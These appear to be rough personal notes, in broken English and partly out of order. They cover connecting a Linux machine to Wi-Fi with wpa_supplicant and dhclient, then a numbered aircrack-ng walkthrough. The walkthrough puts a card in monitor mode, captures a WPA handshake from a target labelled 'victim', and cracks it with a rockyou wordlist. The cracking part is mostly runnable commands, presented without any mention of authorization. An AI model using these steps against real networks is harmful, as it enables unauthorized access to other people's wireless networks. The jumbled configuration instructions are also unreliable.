1. verify NIC wlan0 in mode monitor
1.1 other interface wifi is enable, if you was typing (2)
it's possible desenable wifi, use ifup<name_interface_fail>
in other case ifdown<name_interface_fail> with software
*wpa_supplicant its configuration are
*wpa_supplicant.conf is the configuration file describing all networks that the user wants the computer to connect to. Run the following command to create this file. Replace ESSID and Wi-fi passphrase with your own. 
/etc/wpa_supplicant/wpa_supplicant.conf
The output will be piped to tee which then write to /etc/wpa_supplicant.conf file. Now use the following command to connect your wireless card to wireless access point.
sudo wpa_supplicant -c /etc/wpa_supplicant.conf -i <name_interface>
sudo wpa_supplicant -B -c /etc/wpa_supplicant.conf -i <name_interface> Background
Although we’re authenticated and connected to wireless network, but we don’t have an IP address yet. To obtain a private IP address from DHCP server, use the following command:
sudo dhclient <name_interface>
wpa_passphrase your-ESSID your-passphrase | sudo tee /etc/wpa_supplicant.conf
#other command configuration net:
-sudo ifconfig <name_interface> up
Then find your wireless network name by scanning nearby networks
with command below:

sudo iwlist <name_interface> scan | grep ESSID
 
2. typing iwconfig
3. later airmon-ng check kill
4. iwconfig
5. airmon-ng start <interface network>
6  airodump-ng <interface_network>
7. gettin BSSID and CHANNEL with more power
8.  monitorin of specify red with airodump-ng --bssid <BSSID> --channel <#> -w [name_register_data] <interface_network>
airodump-ng -c<#channel> -w capture-Pat -d <mac-address_victim> wlan0
9. Once capture handshake apply
aircrack-ng -w /usr/share/wordlist/rockyou.txt <file.cap>
example:
aircrack-ng -w password.lst -b <mac_victim> <file.pcap or file.cap>
